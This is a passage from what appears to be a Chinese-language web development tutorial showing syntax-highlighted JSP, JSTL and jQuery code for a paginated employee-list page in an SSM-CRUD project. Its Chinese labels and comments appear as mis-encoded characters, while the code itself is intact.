class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.list&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"emp"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.empId&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.empName&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.gender=="M"?"ç”·":"å¥³"&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.email&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.department.deptName&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    ç¼–è¾‘</span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    åˆ é™¤</span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            åˆ†é¡µæ–‡å­—ä¿¡æ¯<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                å½“å‰è®°å½•æ•°ï¼š$</span><span class="template-variable">&#123;pageInfo.pageNum&#125;</span><span class="xml">é¡µï¼Œæ€»$</span><span class="template-variable">&#123;pageInfo.pages&#125;</span><span class="xml">é¡µ,æ€»$</span><span class="template-variable">&#123;pageInfo.total&#125;</span><span class="xml">æ¡è®°å½•</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            åˆ†é¡µæ¡ä¿¡æ¯<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"Page navigation"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=1"</span>&gt;</span>é¦–é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        æœ‰ä¸Šä¸€é¡µå†æ˜¾ç¤ºç®­å¤´ï¼Œæ²¡æœ‰åˆ™ä¸æ˜¾ç¤º<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.hasPreviousPage&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pageNum-1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">aria-label</span>=<span class="string">"Previous"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;laquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        éå†æ˜¾ç¤ºé¡µç ï¼Œå½“å‰é¡µç é«˜äº®<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.navigatepageNums&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"pageNumb"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageNumb == pageInfo.pageNum&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>$</span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageNumb != pageInfo.pageNum&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>$</span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        æœ‰ä¸‹ä¸€é¡µå†æ˜¾ç¤ºç®­å¤´ï¼Œæ²¡æœ‰åˆ™ä¸æ˜¾ç¤º<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.hasNextPage&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pageNum+1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">aria-label</span>=<span class="string">"Next"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;raquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pages&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>æœ«é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h4 id="å‘˜å·¥ä¿¡æ¯"><a href="#å‘˜å·¥ä¿¡æ¯" class="headerlink" title="å‘˜å·¥ä¿¡æ¯"></a>å‘˜å·¥ä¿¡æ¯</h4><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="ruby">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="ruby">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆ<span class="symbol">http:</span>/<span class="regexp">/localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ ‡é¢˜-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æŒ‰é’®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºè¡¨æ ¼æ•°æ®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    //å‘˜å·¥æ•°æ®ç­‰</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ–‡å­—ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            å½“å‰ï¼šé¡µï¼Œæ€» é¡µ,æ€» æ¡è®°å½•</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        //1.é¡µé¢åŠ è½½å®Œæˆä»¥åï¼Œç›´æ¥å»å‘é€ä¸€ä¸ªajaxè¯·æ±‚ï¼Œè¦åˆ°åˆ†é¡µæ•°æ®</span></span><br><span class="line"><span class="xml">        $(function ()&#123;</span></span><br><span class="line"><span class="xml">           $.ajax(&#123;</span></span><br><span class="line"><span class="xml">               url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">               data:"pn=1",</span></span><br><span class="line"><span class="xml">               type:"GET",</span></span><br><span class="line"><span class="xml">               success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                   // console.log(result);</span></span><br><span class="line"><span class="xml">                   //1.è§£æå¹¶æ˜¾ç¤ºå‘˜å·¥æ•°æ®</span></span><br><span class="line"><span class="xml">                   build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                   //2.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">               &#125;</span></span><br><span class="line"><span class="xml">           &#125;);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">            var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">            $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">                var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">                var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">                var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"ç”·":"å¥³");</span></span><br><span class="line"><span class="xml">                var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">                var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">                /**</span></span><br><span class="line"><span class="xml">                 * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span 